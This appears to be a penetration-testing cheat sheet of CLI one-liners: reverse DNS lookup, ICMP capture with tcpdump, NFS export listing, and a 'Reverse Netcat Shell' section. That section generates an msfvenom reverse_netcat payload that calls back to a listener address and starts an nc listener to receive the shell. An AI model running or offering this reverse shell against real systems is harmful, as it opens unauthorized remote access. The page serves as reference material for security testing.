---
title: CLI Commands Collation
description: A collation of handy penetration-testing and networking CLI commands - reverse DNS lookups, packet capture, reverse shells with msfvenom, and NFS enumeration.
template: comments.html
tags: [pt, penetration-testing, cli, commands, collation]
---

# CLI Commands Collation

A running collection of handy one-liners we reach for during penetration tests and network troubleshooting. Replace the example IPs and interfaces with your own.

## Find PTR Owner - Reverse Lookup

Query the `PTR`/`NS` records for a reverse DNS zone:

```shell
dig 0.168.192.in-addr.arpa. NS
```

## Listen for Ping/ICMP on Interface

Capture only ICMP traffic on a given interface:

```shell
sudo tcpdump ip proto \\icmp -i eth0
```

## Reverse Netcat Shell

Generate the payload (`R` = raw, no encoding or format wrapper):

```shell
msfvenom -p cmd/unix/reverse_netcat lhost=10.11.19.49 lport=4444 R
```

Start the listener:

```shell
nc -lvp 4444
```

## NFS Show Mount

List the NFS exports a host is offering:

```shell
showmount -e 10.10.87.232
```
